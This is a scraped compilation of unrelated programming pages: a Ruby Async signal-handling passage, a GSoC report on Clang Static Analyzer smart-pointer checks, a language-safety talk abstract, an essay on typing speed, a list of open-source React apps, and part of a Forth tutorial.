  task.async do |_handler_task|
    loop do
      hup_trap.wait
      cleanup_and_reopen
    end
  end
end
</pre>


<p>This handler, for the <code>HUP</code> signal, instructs Analogger to sync any data that may still be in buffers out to its logfiles, and then to close and reopen all of them. With Async, since everything is being handled from inside of a reactor event loop, there are two interesting things that happen here.</p>


<pre title="">  hup_trap = Async::IO::Trap.new(:HUP)
  hup_trap.install!
</pre>


<p>This creates a signal handler, and then installs it.</p>


<pre title="">  task.async do |_handler_task|
    loop do
      hup_trap.wait
      cleanup_and_reopen
    end
  end
</pre>


<p>This creates a task. Async leverages <a href="https://ruby-doc.org/core-2.7.1/Fiber.html" target="_blank" rel="noreferrer noopener">Ruby fibers</a> to encapsulate discrete units of execution, and the Task essentially wraps that Fiber with a state management framework.</p>



<p>This code looks like it would just run in a tight loop, calling <code>cleanup_and_reopen</code> over and over. However, the call to <code>hup_trap.wait</code> changes that. The <code>hup_trap.wait</code> causes that fiber to cease executing and passes control back to the reactor. The signal handler encapsulated in the instance of <code>Async::IO::Trap</code> that was created for the <code>HUP</code> signal, if it is triggered by catching such a signal, will tell the reactor that this fiber should be scheduled again. As soon as the reactor is free to do so, it will resume the fiber’s execution at that point, allowing the loop to continue. When the loop restarts, the fiber will yield it’s execution once again. In this way the signal handler remains active and available to handle any number of <code>HUP</code> signals.</p>



<p>Similar methods were created for handling the <code>USR2</code> signal, which Analogger responds to by completely restarting itself, and the <code>INT</code> and <code>TERM</code> signals, which both cause Analogger to shut down gracefully, except in those methods, because the respective signals will only be handled a single time, they do not sit within a loop.</p>


<pre title="">def install_int_term_trap(task: nil, server: nil)
  int_trap = Async::IO::Trap.new(:INT)
  term_trap = Async::IO::Trap.new(:TERM)
  [int_trap, term_trap].each do |trap|
    trap.install!
    task.async do |_handler_task|
      trap.wait

      write_queue if any_in_queue?
      flush_queue
      cleanup
      trap.default!
      Async.logger.info(server) do |buffer|
        buffer.puts "Caught #{trap}"
        buffer.puts 'Stopping all tasks...'
        task.print_hierarchy(buffer)
        buffer.puts '', 'Reactor Hierarchy'
        task.reactor.print_hierarchy(buffer)
      end
      task.stop
    end
  end
end
</pre>


<p>Because this is renovation, the handler also takes advantage of some nice introspection capabilities that exist in Async to output a snapshot of the Reactor internals when it is stopped. This feature doesn’t exist with EventMachine, and it isn’t a <em>functional</em> feature, in that it doesn’t alter the core capabilities of the software in any way, but it is nice because it lets one see what tasks were currently in the system when it was stopped.</p>



<p>Analogger uses several timers, which are blocks of code that get executed either once, or repeatedly, after a given interval, to trigger actions that should occur at periodic intervals (such as ensuring that all logs that may exist in memory buffers are flushed to disk). EventMachine offers some nice syntactic sugar for implementing timers.</p>



<p>Async doesn’t offer any built in sugar for doing this, but timers are simple to implement within a reactor.</p>

It uses symbolic computations to find the defects. Analyzer covers a variety of checks targeted at finding security and API usage bugs, dead code, null dereference, division by zero, and other logic errors. The Clang Static Analyzer already has a checker to find the null pointer dereference in code, however it is not sufficient for higher abstractions such as C++ smart pointers or optionals. By explicitly teaching the C++ standard class behaviors we can make the Analyzer to find more bugs related to modern C++ code.<h2 id="Goal"><a href="#Goal" title="Goal"></a>Goal</h2>Enable Clang Static Analyzer to find the occurrences of null smart pointer dereferences by teaching the observed behaviors of C++ smart pointer classes. Improve the analyzer’s ability to realize the values of the standard smart pointers without having to dig deep into the complex implementation details. We should be able to find more null dereference bugs related to the smart pointers while reducing the number of false positives. Should be able to cover at least one class fully eg. <code>std::unique_ptr</code>, and then extend it to <code>std::shared_ptr</code> or the <code>std::optional</code> if time permits. <h2 id="Summary"><a href="#Summary" title="Summary"></a>Summary</h2>Within the GSoC time period, we could not implement the modeling for all smart pointer methods and operators as we planned. Since the problem was more complicated than what we all anticipated. So far the majority of the modeling for std::unique_ptr is  implemented and committed. We were able to find some promising results with that. We found <strong>8</strong> true positive warnings related to smart pointer null dereference in <a href="https://github.com/llvm/llvm-project" target="_blank" rel="external">LLVM</a> project and <strong>5</strong> warnings in the <a href="https://webkit.org/" target="_blank" rel="external">WebKit</a> project. Even though we were only able to support <code>std::unique_ptr</code> so far, we accomplished to build a base modeling for the smart pointer checkers. And this will act as a consolidated foundation for developing checkers for any C++ objects that are passed by value. That is one of the first conscious attempts to do so and we’ve gained a lot of experience and managed to maintain our integrity - in the sense that the code ended up mostly free of hacks. It could most likely be generalized to modeling the entire C++ standard library. This does not give us the high-level architecture that’ll be needed to deal with the scale of the standard library, but we got our low-level basics right. Also this work will be used to add support for checking other smart pointers <code>std::shard_ptr</code>, <code>std::weak_ptr</code> as well as <code>std::optionals</code>. Also it can be used to build a checker for use-after-free errors. <h2 id="Research"><a href="#Research" title="Research"></a>Research</h2><h3 id="Smart-Pointer"><a href="#Smart-Pointer" title="Smart Pointer"></a>Smart Pointer</h3>A Smart pointer is an abstract data type that simulates a pointer with additional automatic memory management. It manages a dynamically allocated object and ensures the dynamically allocated object is properly cleaned up. Such features are intended to reduce bugs caused by the misuse of pointers while retaining efficiency. Smart pointers typically keep track of the memory they point to, and may also be used to manage other resources, such as network connections and file handles.<h3 id="Unique-Pointer"><a href="#Unique-Pointer" title="Unique Pointer"></a>Unique Pointer</h3>A <code>unique_ptr</code> is a smart pointer that owns and manages another object through a pointer and disposes that object when the <code>unique_ptr</code> goes out of scope. It should be used to own and manage any dynamically allocated object when its ownership is not shared. A <code>unique_ptr</code> explicitly prevents copying of its contained pointer (as would happen with the normal assignment), but the move assignment and move constructor can be used to transfer ownership of the contained pointer to another <code>unique_ptr</code>.</li>
</ul>
<p><strong>Example: 1 Dereferencing default-constructed unique pointer which is null</strong><br></p><figure><div><pre><p><span><span>int</span> <span>foo</span><span>(<span>bool</span> flag)</span> </span>{</p><p><span>std</span>::<span>unique_ptr</span>&lt;<span>int</span>&gt; x; </p><p><span>if</span> (flag) </p><p><span>return</span> <span>0</span>; </p><p><span>return</span> *x;  </p><p>}</p></pre></div></figure>
<p><strong>Example: 2 Dereferencing a unique pointer after calling release()</strong><br></p><figure><div><pre><p><span><span>int</span> <span>bar</span><span>()</span> </span>{</p><p><span>std</span>::<span>unique_ptr</span>&lt;<span>int</span>&gt; x(<span>new</span> <span>int</span>(<span>42</span>)) ;  </p><p>  x.release(); </p><p><span>return</span> *x;   </p><p>}</p></pre></div></figure>
<p>Similar to above cases, other possible cases are dereferencing after calling <code>std::move()</code>, <code>reset()</code> or <code>reset(nullptr)</code>, getting and explicitly deleting inner pointer, or swapping with null pointer using <code>std::swap</code> (<a href="https://vrnithinkumar.github.io/2020/08/31/gsoc-report/#Appendix">more examples in Appendix</a>). Above all cases will result in a crash.</p>
<h2 id="Design"><a href="#Design" title="Design"></a>Design</h2><p>The basic idea of the checker is to keep a record of raw pointers wrapped inside the smart pointers using a map between smart pointer and corresponding inner pointer. Update the map by enumerating all situations when the smart pointer becomes null, as well as the situations when the smart pointer becomes non-null. For example when a smart pointer is default constructed track that smart pointer as it has a null inner pointer. Then check if any of the tracked pointers dereferenced has a null value. To make the bug report more clear attach additional details along the bug path to provide more detailed information on where the smart pointer becomes null.</p>
<h2 id="Alternative-Solution-Considered"><a href="#Alternative-Solution-Considered" title="Alternative Solution Considered"></a>Alternative Solution Considered</h2><p>Another possible solution considered was manipulating symbolic values inside the smart pointer. The limitation that we run into here is that our memory model (“RegionStore”) doesn’t currently allow setting a “default” binding to a whole object when it’s a part (say, a field) of a bigger object. This means that we have to understand how the smart pointer works internally (which field corresponds to what) to manipulate its symbolic value, which ties us to a specific implementation of the C++ standard library. This might still work for a unique pointer which probably always has exactly one field, but for shared pointers it is not the case and has multiple fields. So it depends on the different implementations of the C++ standard library. It has been decided to not go with this approach since this approach is challenging and potentially a lot of work compared to the first approach.</p>
<h2 id="Implementation"><a href="#Implementation" title="Implementation"></a>Implementation</h2><h3 id="Initial-Smart-Pointer-Modeling-and-Checker"><a href="#Initial-Smart-Pointer-Modeling-and-Checker" title="Initial Smart Pointer Modeling and Checker"></a>Initial Smart Pointer Modeling and Checker</h3><p><a href="https://reviews.llvm.org/D81315" target="_blank" rel="external">D81315</a>: Created a basic implementation. </p>
<ul>
<li>Made a separate checker class for emitting diagnostics. Used the new checker to use <code>checkPreCall</code> and put bug reporting logic there.</li>
<li>Kept all smart pointer related modeling logic in <code>SmartPtrModeling</code>. Shared common functionality via a header file shared between the <code>SmartPtrModeling</code> and <code>SmartPtrChecker</code>. </li>
<li>Made a <code>SmartPtrModeling</code> as a dependency to <code>SmartPtrChecker</code>.</li>
<li>Introduced a GDM with <code>MemRegion</code> as key and <code>SVal</code> as value to track the smart pointer and corresponding inner pointer.  </li>
<li>Also added support to model <code>unique_ptr</code> constructor, release and reset methods.</li>
<li>Used <code>evalCall</code> to handle modeling. As part of this enabled constructor support in <code>evalCall</code> event with <a href="https://reviews.llvm.org/D82256" target="_blank" rel="external">D82256</a>. </li>
<li>Implemented <code>checkDeadSymbols</code> to clean up the <code>MemRegion</code> of smart pointers from the program state map when they go out of scope. Keeping the data structures in the program state as minimal as possible so that it would not grow to a great size while analyzing real code and eventually slows down the analysis.</li>
</ul>
<p>With this patch, the model can emit warnings for cases like use after default constructor, use after release, or use after the reset with a null pointer. Kept the <code>SmartPtrChecker</code> under <em>alpha.cplusplus</em> package and smart pointer modeling have to be enabled by the <code>ModelSmartPtrDereference</code> flag.</p>
<h3 id="checkRegionChanges-for-SmartPtrModeling"><a href="#checkRegionChanges-for-SmartPtrModeling" title="checkRegionChanges for SmartPtrModeling"></a>checkRegionChanges for SmartPtrModeling</h3><p><a href="https://reviews.llvm.org/D83836" target="_blank" rel="external">D83836</a>: Implemented <code>checkRegionChanges</code> for <code>SmartPtrModeling</code>. To improve the accuracy, when a smart pointer is passed by a non-const reference into a function, removed the tracked region data. Since it is not sure what happens to the smart pointer inside the function.<br></p><figure><div><pre><p><span><span>int</span> <span>foo</span><span>()</span> </span>{</p><p><span>std</span>::<span>unique_ptr</span>&lt;<span>int</span>&gt; P; </p><p>  bar(&amp;P); </p><p><span>return</span> *P; </p><p>}</p></pre></div></figure>
<p>For example here in the code above, we are passing a default constructed <code>unique_ptr</code> ‘P’ to method <code>bar()</code>. But it is unknown whether the <code>unique_ptr</code> ‘P’ is reset with a valid inner pointer or not inside <code>bar()</code>. To avoid false positives we are not producing any warning on dereference of <code>unique_ptr</code> ‘P’ after <code>bar()</code>.</p>
<h3 id="Modeling-for-unique-ptr-swap-method"><a href="#Modeling-for-unique-ptr-swap-method" title="Modeling for unique_ptr::swap method"></a>Modeling for unique_ptr::swap method</h3><p><a href="https://reviews.llvm.org/D83877" target="_blank" rel="external">D83877</a>: Enabled the <code>SmartPtrModeling</code> to handle the swap method for <code>unique_ptr</code>. The <code>swap()</code> method can be used to exchange ownership of inner pointers between the <code>unique_ptrs</code>. So it is possible to make a <code>unique_ptr</code> null by swapping with another null <code>unique_ptr</code>. With this patch warnings are emitted when a <code>unique_ptr</code> is used after swapping with another <code>unique_ptr</code> with null as an inner pointer.</p>
<h3 id="NoteTag-for-better-reporting"><a href="#NoteTag-for-better-reporting" title="NoteTag for better reporting"></a>NoteTag for better reporting</h3><p><a href="https://reviews.llvm.org/D84600" target="_blank" rel="external">D84600</a>: With NoteTags added more detailed information on where the smart pointer becomes null in the bug path. Introduced a <code>getNullDereferenceBugType()</code> inter-checker API to check if the bug type is interesting.<br><em>After adding NoteTags:</em><br><img src="https://vrnithinkumar.github.io/2020/08/31/gsoc-report/notetag.png" alt="alt text" title="NoteTags"></p>
<h3 id="Modeling-for-unque-ptr-get"><a href="#Modeling-for-unque-ptr-get" title="Modeling for unque_ptr::get()"></a>Modeling for unque_ptr::get()</h3><p><a href="https://reviews.llvm.org/D86029" target="_blank" rel="external">D86029</a>: Modeled to return tracked inner pointer for the <code>get()</code> method. The <code>get()</code> method is used to access the inner pointer. When the inner pointer is used with conditional branching or other symbol constraining methods we can use the constraints on the inner pointer to find whether the corresponding <code>unique_ptr</code> is null or not. When the inner pointer value for a <code>unique_ptr</code> is available from the tracked map we bind that value to the return value of <code>get()</code> method. Also made changes to create <code>conjureSymbolVal</code> in case of missing inner pointer value for a <code>unique_ptr</code> region we are tracking.<br><em>Example:</em><br><img src="https://vrnithinkumar.github.io/2020/08/31/gsoc-report/get.png" alt="alt text" title="Get"></p>
<h3 id="Modeling-for-unique-ptr-bool-conversion"><a href="#Modeling-for-unique-ptr-bool-conversion" title="Modeling for unique_ptr bool conversion"></a>Modeling for unique_ptr bool conversion</h3><p><a href="https://reviews.llvm.org/D86027" target="_blank" rel="external">D86027</a>: Modeling the case where <code>unique_ptr</code> is explicitly converted to bool. It is a common practice to check if a <code>unique_ptr</code> is null or not before accessing it. If the inner pointer value is already tracked and we know the value, we can figure out the corresponding boolean value. And the analyzer will take the branch based on that. Using <code>SValBuilder::conjureSymbolVal</code> to create a symbol when there is no symbol tracked yet and we constrain on that symbol to split the Exploded Graph with assuming null and non-null value.</p></div></div></div></article></div>

								<p>The recent years have seen a renewed interest in the choice of programming language in the development of important/critical software. There is increased realization that some programming languages come with pitfalls that impact the quality of the software produced in that language, with direct consequences for safety and security. This was the main message of the presentation by ANSSI on "Mind your language(s), A Discussion about Languages and Security" at HIS 2014. This is now a mainstream topic of discussion. Looking beyond mere pitfalls, some programming languages contain at their core a few "defect attractors", a term coined by Les Hatton and popularized by Eric Raymond, which defeat attempts at higher software quality. C is a hugely popular programming language for developing important/critical software, in particular embedded software, that has a high number of defect attractors: pointer arithmetic, type punning, manual memory management, text-substitution macros, global variables, manual error handling, implicit type conversions, minimality of syntax. In this presentation, we will discuss major defect attractors in mainstream programming languages such as C/C++, and how they are avoided in well established programming lanugages (such as Ada/OCaml), more recent programming languages (such as Rust/Go), new versions of programming languages (such as C++17/C++20) or subsets of programming languages (such as MISRA-C/SPARK Ada). We will highlight whether the defense comes from language constructs, supporting tools, or a combination thereof.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p>01 Sep 2020</p>

  <p>One of the eternal laws of the internet dictates that as soon as one person says
they have a new thing that lets them type faster — a keyboard, a keyboard
layout, an editor configuration, etc. —&nbsp;somebody else must say: “but typing is
not the bottleneck!”</p>

<p>What the second person means is that the first person is wasting their time.
They’re optimizing something that’s not slowing them down. Typing is not the
bottleneck, because <a href="https://news.ycombinator.com/item?id=9715810">“typing is perhaps 0.5-1% of my programming
time”</a>. Programming is <em>thinking</em>, talking to people, planning,
researching, is what incarnations of person #2 are saying. And if you think your
keyboard is holding you back from thinking, well, you’re wrong.</p>

<p>I get that. I don’t write code the whole day either.</p>

<p>But here’s what I need to write and type besides code: commit messages, pull
request descriptions, emails, tickets, comments on tickets, code reviews,
documentation, Slack messages, notes, journal entries, RFCs, design documents,
requirements.</p>

<p>And being able to type fast and without much effort sure as hell helps. It lets
me get back to the thinking.</p>

<p>Effort, that’s the important one, not raw speed. It doesn’t matter if you can
type 90 words per minutes or 130, but if it takes you <em>effort</em> to type something
and, if given the choice, you’d rather not do it, then we have a problem.</p>

<p>Take me on my phone, for example. It takes me a lot of effort to type on it.
It’s not only that I’m slow because I can’t use more than two fingers, but every
third word is a typo. Or, even more infuriating, it’s the wrong word and I need
to correct autocorrect. Or I switched from English to German while typing and my
phone doesn’t know what an umlaut is anymore.</p>

<p>If you see me typing on my phone chances are you can also hear me producing an
angry growl-like sound.</p>

<p>Which is exactly why I don’t do it a lot. I barely use the note taking apps I
have, because I’d rather type on my computer, with a proper keyboard. I often
refrain from replying to messages if I don’t have to, because, yep, I’d have to
type those replies.</p>

<p>In other words: typing <em>is</em> a bottleneck for me.</p>

<p>And it’s not just me on my phone. Ever had a chat conversation with somebody who
wasn’t comfortable typing? Here’s what you get: short messages, acronyms, typos,
missing sentences. You can <em>read</em> how they struggled to type. I once had a
colleague who had the habit of walking to my desk saying “Ah, before I type all
that up, I thought I’d quickly tell you in person” where “all that” was three to
four paragraphs, at the most.</p>

<p>And that’s what this is about. If you’re not comfortable typing a lot and you’d
rather not write something down then typing <em>is</em> the bottleneck and you need to
fix it. Typing is not something you should need to think about.</p>

<p>Because wouldn’t it be a waste of time if you spend 99% of your time lying in a
hammock, thinking, but then choose not to write all of your ideas down, because
typing <em>is</em> the bottleneck?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s bloody hard to find a good example of a large production-grade, open-source React app.</p>
<p>There are a few reasons for this:</p>
<ol>
<li>
<p><b>No one</b> writes amazing code the first time they write it</p>
<ul>
<li>Experienced product engineers know there’s a trade-off between quality and getting features in the hands of customers. You’re more likely to find ugly tech debt with a <code>//TODO: Improve this later!</code> comment than best practices</li>
</ul>
</li>
<li>
<p>Most companies keep their apps in private repos</p>
<ul>
<li>Trade secrets and all that jazz.</li>
</ul>
</li>
<li>
<p>There’s a <em>lot</em> of beginner-grade repos out there</p>
<ul>
<li>Without a ton of experience, it’s hard to tell the good from the bad</li>
</ul>
</li>
</ol>
<p>On that note, I’ve reviewed the following well-known open-source React apps, and reckon they’re worth checking out.</p>

<p>Project link: <a href="https://github.com/oldboyxx/jira_clone">Jira Clone</a></p>
<p>Jira Clone is… a Jira clone built in modern React, entirely out of functional components with Hooks. It’s noteworthy because its stack is more or less what I’d use on my own side-projects:</p>
<ul>
<li>TypeScript with TypeORM on the backend, communicating with a Postgres database</li>
<li>React on the frontend with a custom webpack config</li>
<li>Relies on Cypress for end-to-end testing</li>
</ul>
<p>On top of that, the author has done an amazing job making it look very similar to Jira (when the clone was built), using a mix of <a href="https://styled-components.com/">styled-components</a> and global styles.</p>
<p>This repo also highlights the benefits of just working on a project by yourself with a clear understanding of what you’re trying to build. You’ll see the contrast when you check out the other projects in this article.</p>

<p>RealWorld by Thinkster re-implements the same app (a Medium.com clone called Conduit) in over 24 different languages and frameworks. In this case, we’re reviewing the React/Redux version.</p>
<p>It uses create-react-app, with react-router for routing, Redux for state management, classNames for styling, superagent for data fetching, with no testing, or type-checking.</p>
<p>It seems like a decent way to understand the syntactical differences between dozens of language and framework combinations, but isn’t exactly a beacon of best practices.</p>

<p>Real World App is a great example of best-practices to use for end-to-end testing an application with Cypress, with example data in the repo, so both tests and the app run out-of-the-box without the need for a database.</p>
<p>It’s built with create-react-app, written in TypeScript with an Express backend, using Material UI as a UI/component library, Formik for forms, and react-router for routing.</p>
<p>It looks like a pretty solid example of an application you would see in the real world, (especially since it uses forms), though data-fetching and form submission are optimised for ease of testing/portability rather than best practices.</p>

<p>Simorgh is the BBC’s React SPA, currently serving millions of users in production around the world. It is being progressively rolled out to each BBC World Service News website, and you can track the progress <a href="https://github.com/bbc/simorgh/blob/latest/docs/Simorgh-Release-Info.md">here</a>.</p>
<p>It uses PropTypes for type-checking, Jest and Enzyme for unit testing, Cypress for end-to-end testing, styled-components for styling (with most components living in <code>@bbc/psammead</code>, which is an awesome component library to check out too), react-router for routing, with Express handling server-side rendering.</p>
<p>It’s extremely well-tested (98% coverage) and well-documented, with READMEs throughout the project to explain large directories.</p>

<p>AST Explorer is a tool for exploring <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract Syntax Trees</a>.</p>
<p>It’s worth checking out as a React project because it’s a good example of a project under continuous development for several years. It’s a classic React project that uses PropTypes for type-checking, and Redux for state management while still using local state where possible.</p>
<p>While you won’t find anything fancy like TypeScript/Flow here, the code is well commented, with hacks and workarounds clearly pointed out.</p>
<p>Some might say there’s some “tech debt”, as the authors have chosen to stick with class components, and not immediately rewrite to functional components + Hooks. Instead, they’ve maintained class components in older files, with functional components + Hooks in newer files.</p>
<p>Also worth noting, that like many real life, open-source projects, AST Explorer was started with the intention of adding tests later, but only one contributor in four years mentioned wanting to add tests in the GitHub Issues.</p>

<p>It’s worth checking out because it’s one of the most popular (in terms of daily users) examples of an un-ejected <a href="https://create-react-app.dev/">create-react-app</a> application I’ve seen in production.</p>
<p>It’s written in relatively modern React (mostly functional components with Hooks) with TypeScript, uses SCSS for styles, there are tests, and rather than using Redux, they’ve <a href="https://reactjs.org/docs/lifting-state-up.html">lifted state up</a> and persisted it in localStorage.</p>

<p>Spectrum is a community site, seeking to combine the features of a real-time chat app with the features of forums. It’s been under active development since early 2017, and was acquired by GitHub at the end of 2018.</p>
<p>Spectrum was very interesting to follow during its early years, as it used RethinkDB for (almost) live updates on queries, server-side rendering and GraphQL (very cutting edge at the time).</p>
<p>The codebase uses Flow for type-checking, Apollo (GraphQL) for data-fetching, Redux for state management, an <a href="https://github.com/withspectrum/spectrum/blob/alpha/hyperion/index.js">Express server</a> for server-side rendering, and uses functional components + Hooks, with custom hooks <a href="https://github.com/withspectrum/spectrum/tree/alpha/src/hooks">here</a>. Naturally, as one of the founders is <a href="https://mxstbr.com/">Max Stoiber</a> (creator of styled-components), the app is styled with styled-components.</p>
<p>Since the acquistion, Max has written a post called <a href="https://mxstbr.com/thoughts/tech-choice-regrets-at-spectrum">Tech Choices I Regret at Spectrum</a> that’s also worth checking out.</p>

<p>It runs on a Django backend, with a React frontend written in TypeScript (with PropTypes too), uses <a href="http://emotion.sh/">Emotion</a> for styling, react-router for routing, Redux for state management, and is a great example of trade-offs and <code>//TODO</code> comments in a SaaS app with users that pay for it.</p>

<p>I almost didn’t add Grafana as an example here, since it’s an AngularJS project in the process of migrating to React.</p>
<p>It’s an AngularJS app being progressively rewritten into a modern React app, written in TypeScript. It uses Redux for state management, an internal design system that uses emotion for styling (<code>@grafana/ui</code>).</p>
<p>It’s kind of a nightmare to navigate as a codebase, mainly due to mixing folders only used by AngularJS with folders only used by React, and that’s exactly why it’s in this article, as an example of what you’ll see in the real world.</p>

<h2 id="introduction">Introduction</h2>

<p>This small ebook is here to teach you a programming language called Forth. Forth is a
language unlike most others. It’s not functional <em>or</em> object oriented, it doesn’t
have type-checking, and it basically has zero syntax. It was written in the 70s, but
is still used today for
<a href="http://www.forth.com/resources/apps/more-applications.html">certain applications</a>.</p>

<p>Why would you want to learn such an odd language? Every new programming
language you learn helps you think about problems in new ways. Forth is very
easy to learn, but it requires you to think in a different way than you’re used
to. That makes it a perfect language to broaden your coding horizons.</p>

<p>This book includes a simple implementation of Forth I wrote in JavaScript. It’s by
no means perfect, and is missing a lot of the functionality you’d expect in a real
Forth system. It’s just here to give you an easy way to try out the examples. (If
you’re a Forth expert, please
<a href="https://github.com/skilldrick/easyforth">contribute here</a> and make it better!)</p>

<p>I’m going to assume that you know at least one other programming language, and have
a basic idea of how stacks work as a data structure.</p>

<h2 id="adding-some-numbers">Adding Some Numbers</h2>

<p>The thing that separates Forth from most other languages is its use of the
stack. In Forth, everything revolves around the stack. Any time you type a
number, it gets pushed onto the stack. If you want to add two numbers together,
typing <code>+</code> takes the top two numbers off the stack, adds them, and puts
the result back on the stack.</p>

<p>Let’s take a look at an example. Type (don’t copy-paste) the following into the
interpreter, typing <code>Enter</code> after each line.</p>

<pre><code>1
2
3
</code></pre>



<p>Every time you type a line followed by the <code>Enter</code> key, the Forth interpreter
executes that line, and appends the string <code>ok</code> to let you know there were no
errors. You should also notice that as you execute each line, the area at the
top fills up with numbers. That area is our visualization of the stack. It
should look like this:</p>

<p>1 2 3 &lt;- Top</p>

<p>Now, into the same interpreter, type a single <code>+</code> followed by the <code>Enter</code> key. The top two
elements on the stack, <code>2</code> and <code>3</code>, have been replaced by <code>5</code>.</p>

<p>1 5 &lt;- Top</p>

<p>At this point, your editor window should look like this:</p>

<p>1  <span>ok</span>
2  <span>ok</span>
3  <span>ok</span>
+  <span>ok</span>
</p>

<p>Type <code>+</code> again and press <code>Enter</code>, and the top two elements will be replaced by 6. If
you type <code>+</code> one more time, Forth will try to pop the top two elements off the
stack, even though there’s only <em>one</em> element on the stack! This results in a
<code>Stack underflow</code> error:</p>

<p>1  <span>ok</span>
2  <span>ok</span>
3  <span>ok</span>
+  <span>ok</span>
+  <span>ok</span>
+  <span>Stack underflow</span>
</p>

<p>Forth doesn’t force you to type every token as a separate line. Type the
following into the next editor, followed by the <code>Enter</code> key:</p>

<pre><code>123 456 +
</code></pre>



<p>The stack should now look like this:</p>

<p>579 &lt;- Top</p>

<p>This style, where the operator appears after the operands, is known as
<a href="https://en.wikipedia.org/wiki/Reverse_Polish_notation">Reverse-Polish
notation</a>. Let’s try
something a bit more complicated, and calculate <code>10 * (5 + 2)</code>. Type the
following into the interpreter:</p>

<pre><code>5 2 + 10 *
</code></pre>



<p>One of the nice things about Forth is that the order of operations is
completely based on their order in the program. For example, when executing <code>5
2 + 10 *</code>, the interpreter pushes 5 to the stack, then 2, then adds them and
pushes the resulting 7, then pushes 10 to the stack, then multiplies 7 and 10.
Because of this, there’s no need for parentheses to group operators with lower
precedence.</p>

<h3 id="stack-effects">Stack Effects</h3>

<p>Most Forth words affect the stack in some way. Some take values off the stack,
some leave new values on the stack, and some do a mixture of both. These “stack
effects” are commonly represented using comments of the form <code>( before -- after
)</code>. For example, <code>+</code> is <code>( n1 n2 -- sum )</code> - <code>n1</code> and <code>n2</code> are the top two numbers
on the stack, and <code>sum</code> is the value left on the stack.</p>

<h2 id="defining-words">Defining Words</h2>

<p>The syntax of Forth is extremely straightforward. Forth code is interpreted as
a series of space-delimited words. Almost all non-whitespace characters are valid
in words. When the Forth interpreter reads a word, it checks to see if a
definition exists in an internal structure known as the Dictionary. If it is
found, that definition is executed. Otherwise, the word is assumed to be a
number, and it is pushed onto the stack. If the word cannot be converted to a
number, an error occurs.</p>

<p>You can try that out yourself below. Type <code>foo</code> (an unrecognized word)
and press enter.</p>



<p>You should see something like this:</p>

<p>foo  <span>foo ?</span></p>

<p><code>foo ?</code> means that Forth was unable to find a definition for <code>foo</code>, and it
wasn’t a valid number.</p>

<p>We can create our own definition of <code>foo</code> using two special words called <code>:</code>
(colon) and <code>;</code> (semicolon).  <code>:</code> is our way of telling Forth we want to create
a definition. The first word after the <code>:</code> becomes the definition name, and the
rest of the words (until the <code>;</code>) make up the body of the definition. It’s
conventional to include two spaces between the name and the body of the
definition. Try entering the following:</p>

<pre><code>: foo  100 + ;
1000 foo
foo foo foo
</code></pre>

<p><strong>Warning:</strong> A common mistake is to miss out the space before the <code>;</code> word. Because Forth
words are space delimited and can contain most characters, <code>+;</code> is a perfectly
valid word and is not parsed as two separate words.</p>



<p>As you’ve hopefully figured out, our <code>foo</code> word simply adds 100 to the value on
top of the stack. It’s not very interesting, but it should give you an idea of
how simple definitions work.</p>

<h2 id="stack-manipulation">Stack Manipulation</h2>

<p>Now we can start taking a look at some of Forth’s predefined words. First,
let’s look at some words for manipulating the elements at the top of the stack.</p>

<h3 id="dup--n----n-n-"><code>dup ( n -- n n )</code></h3>

<p><code>dup</code> is short for “duplicate” – it duplicates the top element of the stack. For example,
try this out:</p>

<pre><code>1 2 3 dup
</code></pre>



<p>You should end up with the following stack:</p>

<p>1 2 3 3 &lt;- Top</p>

<h3 id="drop--n----"><code>drop ( n -- )</code></h3>

<p><code>drop</code> simply drops the top element of the stack. Running:</p>

<pre><code>1 2 3 drop
</code></pre>

<p>gives you a stack of:</p>

<p>1 2 &lt;- Top</p>



<h3 id="swap--n1-n2----n2-n1-"><code>swap ( n1 n2 -- n2 n1 )</code></h3>

<p><code>swap</code>, as you may have guessed, swaps the top two elements of the stack. For example:</p>

<pre><code>1 2 3 4 swap
</code></pre>

<p>will give you:</p>

<p>1 2 4 3 &lt;- Top</p>



<h3 id="over--n1-n2----n1-n2-n1-"><code>over ( n1 n2 -- n1 n2 n1 )</code></h3>

<p><code>over</code> is a bit less obvious: it takes the second element from the top of the
stack and duplicates it to the top of the stack. Running this:</p>

<pre><code>1 2 3 over
</code></pre>

<p>will result in this:</p>

<p>1 2 3 2 &lt;- Top</p>



<h3 id="rot--n1-n2-n3----n2-n3-n1-"><code>rot ( n1 n2 n3 -- n2 n3 n1 )</code></h3>

<p>Finally, <code>rot</code> “rotates” the top <em>three</em> elements of the stack. The third
element from the top of the stack gets moved to the top of the stack, pushing
the other two elements down.</p>

<pre><code>1 2 3 rot
</code></pre>

<p>gives you:</p>

<p>2 3 1 &lt;- Top</p>



<h2 id="generating-output">Generating Output</h2>

<p>Next, let’s look at some words for outputting text to the console.</p>

<h3 id="n-----period"><code>. ( n -- )</code> (period)</h3>

<p>The simplest output word in Forth is <code>.</code>. You can use <code>.</code> to output the top of
the stack in the output of the current line. For example, try running this
(make sure to include all the spaces!):</p>

<pre><code>1 . 2 . 3 . 4 5 6 . . .
</code></pre>



<p>You should see this:</p>

<p>1 . 2 . 3 . 4 5 6 . . . <span>1 2 3 6 5 4  ok</span></p>

<p>Going through this in order, we push <code>1</code>, then pop it off and output it. Then
we do the same with <code>2</code> and <code>3</code>. Next we push <code>4</code>, <code>5</code>, and <code>6</code> onto the stack.
We then pop them off and output them one-by-one. That’s why the last three
numbers in the output are reversed: the stack is last in, first out.</p>

<h3 id="emit--c----"><code>emit ( c -- )</code></h3>

<p><code>emit</code> can be used to output numbers as ascii characters. Just like <code>.</code> outputs
the number at the top of the stack, <code>emit</code> outputs that number as an ascii
character. For example:</p>

<pre><code> 33 119 111 87 emit emit emit emit
</code></pre>



<p>I won’t give the output here so as to not ruin the surprise. This could also be
written as:</p>

<pre><code>87 emit 111 emit 119 emit 33 emit
</code></pre>

<p>Unlike <code>.</code>, <code>emit</code> doesn’t output any space after each character, enabling you
to build up arbitrary strings of output.</p>

<h3 id="cr-----"><code>cr ( -- )</code></h3>

<p><code>cr</code> is short for carriage return – it simply outputs a newline:</p>

<pre><code>cr 100 . cr 200 . cr 300 .
</code></pre>



<p>This will output:</p>

<p>cr 100 . cr 200 . cr 300 .<span>
100
200
300  ok</span></p>

<h3 id="section"><code>." ( -- )</code></h3>

<p>Finally we have <code>."</code> – a special word for outputting strings. The <code>."</code> word works
differently inside definitions to interactive mode. <code>."</code> marks the beginning of
